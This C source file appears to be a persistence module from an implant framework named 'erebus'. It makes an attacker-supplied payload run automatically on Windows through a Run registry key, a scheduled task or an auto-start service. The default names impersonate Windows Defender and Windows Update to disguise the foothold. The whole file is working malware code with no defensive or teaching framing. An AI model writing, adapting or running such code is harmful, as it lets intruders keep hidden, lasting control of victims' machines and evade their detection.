#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "erebus/mod_util.h"
#include "erebus/modules.h"
#include "erebus/pb_modules.h"

int erebus_mod_persist(const uint8_t *config, size_t config_len, uint8_t **out, size_t *out_len) {
    erebus_persist_config cfg;
    if (!erebus_pb_decode_persist_config(config, config_len, &cfg)) return 0;

    char details[1024];
    details[0] = '\0';
    int success = 0;

    if (strcmp(cfg.method, "registry") == 0) {
        if (!cfg.payload_path[0]) { erebus_pb_free_persist_config(&cfg); return 0; }
        const char *name = cfg.name[0] ? cfg.name : "WindowsDefenderUpdate";
        HKEY hkey = NULL;
        const char *root = "HKLM";
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hkey) != ERROR_SUCCESS) {
            root = "HKCU";
            if (RegOpenKeyExA(HKEY_CURRENT_USER,
                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hkey) != ERROR_SUCCESS) {
                erebus_pb_free_persist_config(&cfg);
                return 0;
            }
        }
        success = RegSetValueExA(hkey, name, 0, REG_SZ, (const BYTE *)cfg.payload_path,
            (DWORD)strlen(cfg.payload_path) + 1) == ERROR_SUCCESS;
        RegCloseKey(hkey);
        snprintf(details, sizeof(details), "%s\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\%s = %s",
            root, name, cfg.payload_path);
    } else if (strcmp(cfg.method, "schtask") == 0) {
        if (!cfg.payload_path[0]) { erebus_pb_free_persist_config(&cfg); return 0; }
        const char *name = cfg.name[0] ? cfg.name : "WindowsUpdate";
        const char *trigger = cfg.trigger[0] ? cfg.trigger : "ONLOGON";
        char cmd[2048];
        snprintf(cmd, sizeof(cmd),
            "schtasks.exe /Create /TN \"%s\" /TR \"%s\" /SC %s /F", name, cfg.payload_path, trigger);
        char *so = NULL, *se = NULL;
        int32_t code = 1;
        success = erebus_mod_run_cmd(cmd, &so, &se, &code) && code == 0;
        snprintf(details, sizeof(details), "task '%s' trigger %s -> %s", name, trigger, cfg.payload_path);
        free(so); free(se);
    } else if (strcmp(cfg.method, "service") == 0) {
        if (!cfg.payload_path[0]) { erebus_pb_free_persist_config(&cfg); return 0; }
        const char *name = cfg.name[0] ? cfg.name : "WindowsDefenderSvc";
        char cmd[2048];
        snprintf(cmd, sizeof(cmd),
            "sc.exe create \"%s\" binPath= \"%s\" start= auto DisplayName= \"Windows Defender Service\"",
            name, cfg.payload_path);
        char *so = NULL, *se = NULL;
        int32_t code = 1;
        success = erebus_mod_run_cmd(cmd, &so, &se, &code) && code == 0;
        snprintf(details, sizeof(details), "service '%s' -> %s", name, cfg.payload_path);
        free(so); free(se);
    } else {
        erebus_pb_free_persist_config(&cfg);
        return 0;
    }

    int ok = erebus_pb_encode_persist_result(success, cfg.method, details, out, out_len);
    erebus_pb_free_persist_config(&cfg);
    return ok;
}